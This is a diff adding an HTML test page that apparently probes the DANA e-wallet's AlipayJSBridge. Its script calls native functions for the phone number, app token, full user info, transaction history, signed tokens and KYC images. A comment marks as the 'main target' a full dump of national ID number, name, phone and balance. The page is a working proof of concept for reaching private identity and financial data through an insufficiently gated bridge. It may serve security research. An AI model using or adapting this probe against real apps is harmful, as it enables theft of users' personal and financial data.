@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v2</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px}
+  h3{color:#ff0;margin:14px 0 4px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:260px;overflow:auto}
+</style>
+</head>
+<body>
+<h3 style="color:#0ff">v2 - event names fixed</h3>
+<h3>[1] Bridge presence</h3><pre id="p-bridge" class="pending">pending</pre>
+<h3>[2] getPhoneNumber</h3><pre id="p-phone" class="pending">pending</pre>
+<h3>[3] getAppToken</h3><pre id="p-token" class="pending">pending</pre>
+<h3>[4] getUserInfoData {event:getUserInformation} - TARGET</h3><pre id="p-info" class="pending">pending</pre>
+<h3>[5] getUserInfoData {event:getUserInfo}</h3><pre id="p-info2" class="pending">pending</pre>
+<h3>[6] getTransactionHistoryList p1</h3><pre id="p-hist" class="pending">pending</pre>
+<h3>[7] GenerateNativeSignedToken</h3><pre id="p-signed" class="pending">pending</pre>
+<h3>[8] getInfoOmni (contrast: gated)</h3><pre id="p-omni" class="pending">pending</pre>
+<h3>[9] getKycImageOmni empty client (contrast: gated)</h3><pre id="p-kyc" class="pending">pending</pre>
+<h3>[10] getUsername</h3><pre id="p-user" class="pending">pending</pre>
+<h3>[11] URL / environment</h3><pre id="p-env" class="pending">pending</pre>
+
+<script>
+(function(){
+  var log=function(id,obj){var el=document.getElementById(id);el.className='ok';try{el.textContent=typeof obj==='string'?obj:JSON.stringify(obj,null,1)}catch(e){el.textContent=String(obj)}};
+  var err=function(id,e){var el=document.getElementById(id);el.className='err';el.textContent='ERROR: '+(e&&e.message?e.message:String(e))};
+  log('p-env',{href:location.href,ua:navigator.userAgent});
+
+  function call(fn,param,cb){try{window.AlipayJSBridge.call(fn,param||{},function(r){cb(null,r)})}catch(e){cb(e)}}
+  function T(id,fn,param){setTimeout(function(){call(fn,param,function(e,r){e?err(id,e):log(id,r)})},600)}
+
+  function bridgeReady(cb){
+    if(window.AlipayJSBridge){cb();return}
+    document.addEventListener('AlipayJSBridgeReady',cb,false);
+    setTimeout(cb,4000);
+  }
+
+  bridgeReady(function(){
+    try{
+      log('p-bridge',{hasAlipayJSBridge:!!window.AlipayJSBridge,
+        startupParams:(window.AlipayJSBridge&&window.AlipayJSBridge.startupParams)?window.AlipayJSBridge.startupParams:'n/a'});
+    }catch(e){err('p-bridge',e)}
+
+    T('p-phone','getPhoneNumber');
+    T('p-token','getAppToken');
+
+    /* MAIN TARGET - full UserInfo dump (ktpId/NIK, ktpName, phone, balance) */
+    T('p-info','getUserInfoData',{event:"getUserInformation",info:{queryBy:["*"],queryType:"FULL"}});
+    T('p-info2','getUserInfoData',{event:"getUserInfo"});
+
+    T('p-hist','getTransactionHistoryList',{pageNum:1,orderBy:"TIME",orderStatus:"COMPLETED"});
+    T('p-signed','GenerateNativeSignedToken',{});
+
+    /* contrast tests - these ARE gated server-side; failures here prove the gate exists elsewhere */
+    T('p-omni','getInfoOmni',{});
+    T('p-kyc','getKycImageOmni',{clientId:"",accessToken:""});
+
+    T('p-user','getUsername');
+  });
+})();
+</script>
+</body>
+</html>
